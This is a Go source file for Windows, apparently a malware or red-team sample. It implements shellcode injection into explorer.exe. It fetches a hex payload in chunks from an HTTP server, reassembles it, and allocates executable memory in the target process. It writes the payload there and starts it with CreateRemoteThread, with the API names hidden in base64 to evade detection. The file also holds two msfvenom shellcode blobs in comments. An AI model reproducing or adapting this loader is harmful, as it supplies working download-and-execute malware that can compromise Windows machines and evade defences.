//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sort"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

type keyValue struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

// unsafe.Sizeof(windows.ProcessEntry32{})
const processEntrySize = 568

func processID(name string) (uint32, error) {
	h, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	p := windows.ProcessEntry32{Size: processEntrySize}
	for {
		err := windows.Process32Next(h, &p)
		if err != nil {
			return 0, err
		}
		if windows.UTF16ToString(p.ExeFile[:]) == name {
			return p.ProcessID, nil
		}
	}
	return 0, fmt.Errorf("%q not found", name)
}

func openProcess(pid uint32) (handle *windows.Handle, err error) {
	const openProcessparams = windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION
	// Get a handle on remote process
	pHandle, err := windows.OpenProcess(openProcessparams, false, pid)
	if err != nil {
		return nil, err
	}
	return &pHandle, nil

}

func decodeString(s string) string {
	sDecoded, _ := base64.StdEncoding.DecodeString(s)
	return string(sDecoded)
}

func fetchPayload() string {
	// Make an HTTP GET request
	resp, err := http.Get("http://localhost:8080/report")
	if err != nil {
		fmt.Println("Error making GET request:", err)
		return ""
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return ""
	}

	// Parse the JSON response
	var data struct {
		Report []keyValue `json:"report"`
	}
	if err := json.Unmarshal(body, &data); err != nil {
		fmt.Println("Error decoding JSON:", err)
		return ""
	}

	// Sort the byte map by keys (converted to integers)
	sort.Slice(data.Report, func(i, j int) bool {
		ki, _ := strconv.Atoi(data.Report[i].Key)
		kj, _ := strconv.Atoi(data.Report[j].Key)
		return ki < kj
	})

	// Concatenate values to reconstruct the hex string
	var hexString string
	for _, kv := range data.Report {
		hexString += kv.Value
	}

	fmt.Println("Reconstructed Hex String:", hexString)
	// fetch payload from server
	return hexString
}

func inject(handle *windows.Handle, payload []byte) (err error) {

	kdll := "a2VybmVsMzIuZGxs"
	wpm := "V3JpdGVQcm9jZXNzTWVtb3J5"
	valex := "VmlydHVhbEFsbG9jRXg="
	crtid := "Q3JlYXRlUmVtb3RlVGhyZWFk"

	const allocParams = windows.MEM_COMMIT | windows.MEM_RESERVE
	kernel32DLL := windows.NewLazySystemDLL(decodeString(kdll))
	WriteProcessMemory := kernel32DLL.NewProc(decodeString(wpm))
	VirtualAllocEx := kernel32DLL.NewProc(decodeString((valex)))
	CreateRemoteThread := kernel32DLL.NewProc(decodeString(crtid))

	remoteCode, _, err := VirtualAllocEx.Call(uintptr(*handle), 0, uintptr(len(payload)), windows.MEM_COMMIT, windows.PAGE_EXECUTE_READ)

	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("ops %v", err.Error())
		return err
	}

	// Write the payload into the code cave
	_, _, err = WriteProcessMemory.Call(uintptr(*handle), remoteCode, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))

	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", err.Error()))
	}

	hThread, _, err := CreateRemoteThread.Call(uintptr(*handle), 0, 0, remoteCode, 0, 0, 0)

	if err != nil && err.Error() != "The operation completed successfully." {
		windows.WaitForSingleObject(windows.Handle(hThread), 500)
		windows.CloseHandle(windows.Handle(hThread))
	}
	return nil
}

func main() {

	procName := "ZXhwbG9yZXIuZXhl" // explorer.exe
	pid, err := processID(decodeString(procName))

	if err != nil {
		log.Fatalln(err)
	}

	// calc 64, generated with msfvenom
	// payload, err := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500")

	// messagebox 64, generated with msfvenom
	// payload, err := hex.DecodeString("fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1000000003e488d95fe0000003e4c8d85060100004831c941ba45835607ffd54831c941baf0b5a256ffd557303020573030004d657373616765426f7800")

	payload, err := hex.DecodeString(fetchPayload())

	if err != nil {

		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", err.Error()))
	}

	pHandle, errProc := openProcess(uint32(pid))

	if errProc != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errProc.Error()))
	} else {
		inject(pHandle, payload)
		windows.CloseHandle(*pHandle)
	}
	windows.Exit(0)
}
